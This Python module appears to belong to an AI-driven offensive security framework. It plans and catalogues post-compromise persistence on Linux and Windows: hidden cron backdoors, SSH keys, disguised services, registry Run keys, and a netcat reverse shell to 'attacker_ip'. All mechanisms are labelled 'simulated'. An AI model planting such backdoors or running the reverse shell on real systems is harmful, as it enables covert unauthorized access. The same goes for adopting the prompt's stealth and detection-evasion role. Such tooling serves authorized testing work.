#!/usr/bin/env python3
"""
Persistence Agent - Maintain access to compromised systems
"""

import json
import logging
from typing import Dict, List
from core.llm_manager import LLMManager

logger = logging.getLogger(__name__)


class PersistenceAgent:
    """Agent responsible for maintaining access"""
    
    def __init__(self, config: Dict):
        """Initialize persistence agent"""
        self.config = config
        self.llm = LLMManager(config)
        logger.info("PersistenceAgent initialized")
    
    def execute(self, target: str, context: Dict) -> Dict:
        """Execute persistence phase"""
        logger.info(f"Starting persistence establishment on {target}")
        
        results = {
            "target": target,
            "status": "running",
            "persistence_mechanisms": [],
            "backdoors_installed": [],
            "scheduled_tasks": [],
            "ai_recommendations": {}
        }
        
        try:
            # Get previous phase data
            privesc_data = context.get("phases", {}).get("privilege_escalation", {})
            
            if not privesc_data.get("successful_escalations"):
                logger.warning("No privilege escalation achieved. Limited persistence options.")
                results["status"] = "limited"
            
            # Phase 1: AI-Powered Persistence Strategy
            logger.info("Phase 1: AI persistence strategy")
            strategy = self._ai_persistence_strategy(context)
            results["ai_recommendations"] = strategy
            
            # Phase 2: Establish Persistence Mechanisms
            logger.info("Phase 2: Establishing persistence mechanisms")
            
            system_info = privesc_data.get("system_info", {})
            os_type = system_info.get("os", "unknown")
            
            if os_type == "linux":
                results["persistence_mechanisms"].extend(
                    self._establish_linux_persistence()
                )
            elif os_type == "windows":
                results["persistence_mechanisms"].extend(
                    self._establish_windows_persistence()
                )
            
            # Phase 3: Install Backdoors
            logger.info("Phase 3: Installing backdoors")
            results["backdoors_installed"] = self._install_backdoors(os_type)
            
            # Phase 4: Create Scheduled Tasks
            logger.info("Phase 4: Creating scheduled tasks")
            results["scheduled_tasks"] = self._create_scheduled_tasks(os_type)
            
            results["status"] = "completed"
            logger.info("Persistence phase completed")
            
        except Exception as e:
            logger.error(f"Error during persistence: {e}")
            results["status"] = "error"
            results["error"] = str(e)
        
        return results
    
    def _ai_persistence_strategy(self, context: Dict) -> Dict:
        """Use AI to plan persistence strategy"""
        prompt = self.llm.get_prompt(
            "persistence",
            "ai_persistence_strategy_user",
            default=f"""
Plan a comprehensive persistence strategy based on the following context:

{json.dumps(context, indent=2)}

Provide:
1. Recommended persistence techniques (prioritized)
2. Stealth considerations
3. Resilience against system reboots
4. Evasion of detection mechanisms
5. Multiple fallback mechanisms
6. Cleanup and removal procedures

Response in JSON format with detailed implementation plan.
"""
        )
        
        system_prompt = self.llm.get_prompt(
            "persistence",
            "ai_persistence_strategy_system",
            default="""You are an expert in persistence techniques and advanced persistent threats.
Design robust, stealthy persistence mechanisms that survive reboots and detection attempts.
Consider both Windows and Linux environments.
Prioritize operational security and longevity."""
        )
        
        try:
            formatted_prompt = prompt.format(context_json=json.dumps(context, indent=2))
            response = self.llm.generate(formatted_prompt, system_prompt)
            return json.loads(response)
        except Exception as e:
            logger.error(f"AI persistence strategy error: {e}")
            return {"error": str(e)}
    
    def _establish_linux_persistence(self) -> List[Dict]:
        """Establish Linux persistence mechanisms"""
        mechanisms = []
        
        # Cron job
        mechanisms.append({
            "type": "cron_job",
            "description": "Scheduled task for persistence",
            "command": "*/5 * * * * /tmp/.hidden/backdoor.sh",
            "status": "simulated"
        })
        
        # SSH key
        mechanisms.append({
            "type": "ssh_key",
            "description": "Authorized keys persistence",
            "location": "~/.ssh/authorized_keys",
            "status": "simulated"
        })
        
        # Systemd service
        mechanisms.append({
            "type": "systemd_service",
            "description": "Persistent system service",
            "service_name": "system-update.service",
            "status": "simulated"
        })
        
        # bashrc modification
        mechanisms.append({
            "type": "bashrc",
            "description": "Shell initialization persistence",
            "location": "~/.bashrc",
            "status": "simulated"
        })
        
        return mechanisms
    
    def _establish_windows_persistence(self) -> List[Dict]:
        """Establish Windows persistence mechanisms"""
        mechanisms = []
        
        # Registry Run key
        mechanisms.append({
            "type": "registry_run",
            "description": "Registry autorun persistence",
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "status": "simulated"
        })
        
        # Scheduled task
        mechanisms.append({
            "type": "scheduled_task",
            "description": "Windows scheduled task",
            "task_name": "WindowsUpdate",
            "status": "simulated"
        })
        
        # WMI event subscription
        mechanisms.append({
            "type": "wmi_event",
            "description": "WMI persistence",
            "status": "simulated"
        })
        
        # Service installation
        mechanisms.append({
            "type": "service",
            "description": "Windows service persistence",
            "service_name": "WindowsSecurityUpdate",
            "status": "simulated"
        })
        
        return mechanisms
    
    def _install_backdoors(self, os_type: str) -> List[Dict]:
        """Install backdoors"""
        backdoors = []
        
        if os_type == "linux":
            backdoors.extend([
                {
                    "type": "reverse_shell",
                    "description": "Netcat reverse shell",
                    "command": "nc -e /bin/bash attacker_ip 4444",
                    "status": "simulated"
                },
                {
                    "type": "ssh_backdoor",
                    "description": "SSH backdoor on alternate port",
                    "port": 2222,
                    "status": "simulated"
                }
            ])
        elif os_type == "windows":
            backdoors.extend([
                {
                    "type": "powershell_backdoor",
                    "description": "PowerShell reverse shell",
                    "status": "simulated"
                },
                {
                    "type": "meterpreter",
                    "description": "Meterpreter payload",
                    "status": "simulated"
                }
            ])
        
        return backdoors
    
    def _create_scheduled_tasks(self, os_type: str) -> List[Dict]:
        """Create scheduled tasks"""
        tasks = []
        
        if os_type == "linux":
            tasks.append({
                "type": "cron",
                "schedule": "*/10 * * * *",
                "command": "Callback beacon every 10 minutes",
                "status": "simulated"
            })
        elif os_type == "windows":
            tasks.append({
                "type": "scheduled_task",
                "schedule": "Daily at 2 AM",
                "command": "Callback beacon",
                "status": "simulated"
            })
        
        return tasks
